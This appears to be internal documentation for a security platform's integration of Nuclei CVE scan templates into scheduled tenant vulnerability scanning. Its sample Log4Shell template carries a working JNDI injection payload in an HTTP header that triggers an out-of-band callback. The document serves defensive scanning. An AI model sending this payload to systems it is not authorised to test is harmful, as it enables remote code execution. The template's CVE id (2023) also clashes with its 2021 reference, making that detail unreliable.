# K-VENDOR-NUC-002 -- CVE Vulnerability Templates

## Overview

CVE templates are Nuclei scan definitions that detect specific known vulnerabilities. Each template encodes the HTTP request, matching conditions, and metadata needed to confirm whether a target is vulnerable to a particular CVE.

## Template Structure

```yaml
id: CVE-2023-44228
info:
  name: Apache Log4j RCE (Log4Shell)
  author: projectdiscovery
  severity: critical
  description: Remote code execution via JNDI lookup in Log4j
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  tags: cve,cve2021,rce,log4j,apache
  classification:
    cvss-score: 10.0
    cwe-id: CWE-502

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      X-Api-Version: "${jndi:ldap://{{interactsh-url}}}"
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
```

## Key Fields Consumed by Kubric

| Field | Usage |
|---|---|
| `id` | Unique template identifier; indexed by VDR |
| `severity` | Maps to Kubric alert tiers (critical/high/medium/low/info) |
| `classification.cwe-id` | Links to CWE STIX data (MIT-003) for ATT&CK mapping |
| `classification.cvss-score` | Combined with EPSS for risk prioritization |
| `tags` | Used for template filtering during targeted scans |

## Kubric Integration

VDR schedules Nuclei CVE scans against tenant asset inventories. The scan pipeline:

1. **Target resolution** -- K-SVC provides the tenant's asset list (IPs, domains, URLs)
2. **Template selection** -- VDR selects CVE templates matching the tenant's technology stack
3. **Scan execution** -- Nuclei runs as a subprocess with `-jsonl` output
4. **Result ingestion** -- VDR parses findings, enriches with EPSS scores, and publishes to NATS
5. **MITRE mapping** -- Each finding is linked to ATT&CK techniques via the CWE-CAPEC bridge

Findings are published to `kubric.{tenant}.vuln.scan.v1` and displayed in the NOC dashboard.

## Update Cadence

New CVE templates are added daily by the ProjectDiscovery community. Sync with `scripts/vendor-pull.sh nuclei`.
